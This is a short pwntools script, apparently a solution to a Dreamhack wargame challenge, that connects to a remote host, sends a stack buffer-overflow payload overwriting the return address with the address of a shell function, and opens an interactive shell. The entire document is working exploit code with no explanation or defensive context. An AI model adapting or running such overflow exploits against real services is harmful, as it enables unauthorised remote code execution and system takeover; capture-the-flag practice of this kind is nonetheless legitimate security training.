from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 16050
r = remote(HOST, PORT)

sh=0x401256

payload=b'A'*264+b'A'*8+b'B'*8+p64(sh)
payload += b'A'*(0x928-len(payload)-0x28)
payload += p64(0x4045b0) * 5
payload += b'A'*8
payload += b'\x00' * (8 - (len(payload) % 8))

r.sendlineafter(b'Size: ', str(len(payload)).encode())
r.sendlineafter(b'Data: ', payload)

r.interactive()
